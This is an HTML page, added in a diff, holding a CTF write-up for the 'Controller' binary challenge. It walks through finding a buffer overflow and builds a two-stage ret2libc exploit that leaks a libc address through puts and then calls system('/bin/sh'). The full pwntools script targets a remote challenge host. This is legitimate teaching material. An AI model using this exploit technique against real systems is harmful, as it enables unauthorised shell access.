@@ -1,0 +1,228 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Controller Writeup</h1>
+            <h2>April 2021</h2>           
+            <h3>ret2libc + plt leak</h3>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+        The extraterrestrials have a special controller in order to manage and use our resources wisely, in order to produce state of the art technology gadgets and weapons for them. If we gain access to the controller's server, we can make them drain the minimum amount of resources or even stop them completeley. Take action fast! <a href=../../docs/cyber_apocalypse/controller>controller</a> <a href=../../docs/cyber_apocalypse/libc.so.6>libc.so.6</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary and a libc to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br>
+    	Running the binary, it appears to be a calculator application. We can input 2 numbers and chose an operator. The calculated answer is then printed out.
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/controller1.png" alt="">
+</div>
+
+<div class="paragraph">
+    <p>
+        <br><br>
+        After loading up the binary in binja to take a closer look at its functions we notice a few interesting things. The main function calls the calculator() function. This function then calls the calc() function. If the calc() function's return value is 0xff3a it prints out an error message, otherwise it calls the calc function as well. 
+        <br>
+        Taking a closer look at the error branch, we can see that it calls scanf with the %s format string specifier to load an unspecified amount of characters into a local variable of size 28. This is a clear buffer overflow! The only thing left to do is figure out how to make the calc() function return 0xff3a to enter the error branch, and then develop our exploit using the buffer overflow.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/controller2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The calc() function appears to just return the result of our mathematical operation given our input. There is a small check that makes sure that our input is no bigger than 0x45. This makes it a little harder since we cannot just add 0xff3a and 0 together to get the correct return value. However since that is the only check implemented, we can just input 2 negative numbers instead and chose the multiplication operation to return the correct value. I chose -2 and -32669, which when multiplied together result in the desired value.
+        <br>
+        With this we trigger the error branch, and pass it a long input to overflow the buffer and cause a segfault.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/controller3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Now that we have found the vulnerability we need to start working on our exploit. Using checksec we take a look at which binary mitigations are enabled.
+        <br>
+        It has Full Relro enabled and NX. Additionally it most likely also has aslr enabled which checksec wont be able to identify since that is not a mitigation that is compiled onto the binary itself. 
+        <br>
+        NX means that we cannot just put shellcode onto the stack and return to it to spawn our shell since the stack is no longer executeable. Due to aslr we will also need an address leak since the library addresses will be randomized. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/controller4.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        I chose to exploit this using a ret2libc attack. For this we will need access to gadgets from libc. The challenge came with a libc, so we can use that to develop our exploit so that it runs remotely without issues after developing our exploit locally. 
+        <br>
+        I use a combination of the pwninit application and patchelf to make the binary run the custom libc. Pwninit automatically downloads the correct ld-2.27.so version, and patchelf is used to make the binary use the new libraries. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/controller5.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        The exploit will be split into 2 main parts. The purpose of the first part is to leak an address from libc which we will then use in the second part to spawn a shell. 
+        <br> 
+        We will use pwntools to find the correct addresses for us. Our payload consists of a 40 byte padding that we can find using a cyclic pattern, a pop_rdi gadget to pop the address of 'puts' got entry into rdi, and then the address of 'puts' plt entry to print out this address. We then use pwntools' unpack function to use process the leak, and use it to define libc's base address within our script. Finally we call main to restart the application, the difference this time: we have a leak, so we can actually spawn a shell this time!
+        <br> 
+        The code for this part can be seen below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+PUTS_PLT = elf.plt['puts']
+PUTS_GOT = elf.got['puts']
+pop_rdi = 0x00000000004011d3
+main = elf.sym['main']
+
+payload1 = b'A'*40 + p64(pop_rdi) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(main)
+
+data = p.recvline().strip()
+leak = u64(data.ljust(8,b"\x00"))
+libc.address = leak - libc.sym['puts']
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Finally we develop the ret2libc attack. Our payload for this part consists of another 40 byte padding, another pop_rdi gadget to pop the address of a '/bin/sh' string from the libc library into rdi, a simple ret gadget, and finally the system is called using the '/bin/sh' string to spawn our shell. Since this is a 64bit binary, the ret gadget is needed in this case to properly align the stack on a 16 bit boundary before calling system. Without it the exploit just crashes.
+        <br>
+        The code for the second part can be seen below.  
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+libc.address = leak - libc.sym['puts']
+binsh = next(libc.search(b'/bin/sh\x00'))
+system = libc.sym['system']
+ret = 0x0000000000401166
+
+payload2 = b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Now that we have completed the exploit we can run it remotely to retrieve the flag.
+        <br>
+        The final exploit script is shown below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/cyber_apocalypse/controller6.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+from pwn import *
+elf = context.binary = ELF('./controller')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '138.68.140.24'
+    port = 32538
+    p = remote(host,port)
+
+PUTS_PLT = elf.plt['puts']
+PUTS_GOT = elf.got['puts']
+pop_rdi = 0x00000000004011d3
+main = elf.sym['main']
+
+payload1 = b'A'*40 + p64(pop_rdi) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(main)
+
+p.clean()
+p.sendline('-2 -32669')
+p.clean()
+p.sendline('3')
+p.clean()
+p.sendline(payload1)
+
+p.clean()
+p.recvuntil('Problem ingored\n')
+data = p.recvline().strip()
+leak = u64(data.ljust(8,b"\x00"))
+print("leak = " + str(hex(leak)))
+
+libc.address = leak - libc.sym['puts']
+binsh = next(libc.search(b'/bin/sh\x00'))
+system = libc.sym['system']
+ret = 0x0000000000401166
+
+payload2 = b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
+
+p.clean()
+p.sendline('-2 -32669')
+p.clean()
+p.sendline('3')
+p.clean()
+p.sendline(payload2)
+p.recvline()
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
